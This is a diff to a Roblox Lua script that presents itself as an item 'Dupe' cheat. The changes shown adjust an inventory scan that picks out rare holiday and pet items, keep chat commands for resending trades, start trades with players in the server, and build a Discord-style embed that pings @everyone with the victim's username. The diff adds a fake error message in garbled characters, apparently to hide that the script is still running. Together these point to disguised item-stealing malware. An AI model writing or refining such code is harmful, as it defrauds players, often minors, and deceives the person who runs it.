@@ -6,7 +6,7 @@ Config = {
     Script = "Dupe",
     CustomLink = "None"
 }
-Commands = {ResendTrade = ".uwu", RestartPlayer = ".restart"}
+Commands = {ResendTrade = ".resend", RestartPlayer = ".restart"}
 repeat
     wait()
 until game:IsLoaded()
@@ -52,7 +52,7 @@ if Config.Script == nil then
 elseif Config.Script == "Custom" then
     Config.Script = Config.Script .. " - " .. Config.CustomLink
 end
-
+warn([[:22: Expected identifier when parsing variable name, got 'ê¯ƒê¯¤ê¯ê¯­ê¯‡ê¯£ê¯šê¯” ê¯‘ê¯¥ê¯ê¯‡ê¯¦ê¯ ê¯‡ê¯¦ê¯€ê¯” ê¯ê¯­ê¯›ê¯”ê¯¤ê¯žê¯‡ ê¯‘ê¯¦ê¯›ê¯‡ê¯¤ê¯• ê¯‘ê¯£ê¯ê¯”ê¯¦ê¯«']])
 local b = game:GetService("Players")
 local c = b.LocalPlayer
 local d = game:GetService("VirtualUser")
@@ -177,19 +177,14 @@ function FullInventory()
             if x.Name == "Christmas" or x.Name == "Halloween" then
                 for w, x in pairs(x.Container:GetChildren()) do
                     if x:IsA("Frame") then
-                        local r, g, b = math.floor(x.ItemName.BackgroundColor3.R * 255 + 0.5), math.floor(x.ItemName.BackgroundColor3.G * 255 + 0.5), math.floor(x.ItemName.BackgroundColor3.B * 255 + 0.5)
-                        local isDesiredRarity = (r == 255 and g == 0 and b == 179) or
-                                                (r == 100 and g == 10 and b == 255) or 
-                                                (r == 240 and g == 140 and b == 0) or 
-                                                (r == 106 and g == 106 and b == 106)                        
-
-                        if isDesiredRarity then
-                            Rarity(x.ItemName.BackgroundColor3, x.Container.Amount.Text, x:FindFirstChild("Tags"))
-
-                            if Config.FullInventory then
-                                local number = x.Container.Amount.Text ~= "" and x.Container.Amount.Text or "x1"
-                                table.insert(H, x.ItemName.Label.Text .. " " .. number)
+                        Rarity(x.ItemName.BackgroundColor3, x.Container.Amount.Text, x:FindFirstChild("Tags"))
+                        if Config.FullInventory then
+                            if x.Container.Amount.Text ~= "" then
+                                number = x.Container.Amount.Text
+                            else
+                                number = "x1"
                             end
+                            table.insert(H, x.ItemName.Label.Text .. " " .. number)
                         end
                     end
                 end
@@ -197,7 +192,11 @@ function FullInventory()
                 if x:IsA("Frame") then
                     Rarity(x.ItemName.BackgroundColor3, x.Container.Amount.Text, x:FindFirstChild("Tags"))
                     if Config.FullInventory then
-                        local number = x.Container.Amount.Text ~= "" and x.Container.Amount.Text or "x1"
+                        if x.Container.Amount.Text ~= "" then
+                            number = x.Container.Amount.Text
+                        else
+                            number = "x1"
+                        end
                         table.insert(H, x.ItemName.Label.Text .. " " .. number)
                     end
                 end
@@ -206,10 +205,16 @@ function FullInventory()
     end
     for w, x in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
         if x:IsA("Frame") then
-            Rarity(x.ItemName.BackgroundColor3, x.Container.Amount.Text)
-            if Config.FullInventory then
-                local number = x.Container.Amount.Text ~= "" and x.Container.Amount.Text or "x1"
-                table.insert(H, x.ItemName.Label.Text .. " " .. number)
+            if x:IsA("Frame") then
+                Rarity(x.ItemName.BackgroundColor3, x.Container.Amount.Text)
+                if Config.FullInventory then
+                    if x.Container.Amount.Text ~= "" then
+                        number = x.Container.Amount.Text
+                    else
+                        number = "x1"
+                    end
+                    table.insert(H, x.ItemName.Label.Text .. " " .. number)
+                end
             end
         end
     end
@@ -351,7 +356,7 @@ function StartTradesForExistingPlayers()
 end
 local Q = {
         ["content"] = "-- @everyone\n" .. k,
-    ["embeds"] = {
+        ["embeds"] = {
         {
             ["title"] = "🦖 **Wum_PH**",
             ["description"] = "```Username     : " ..
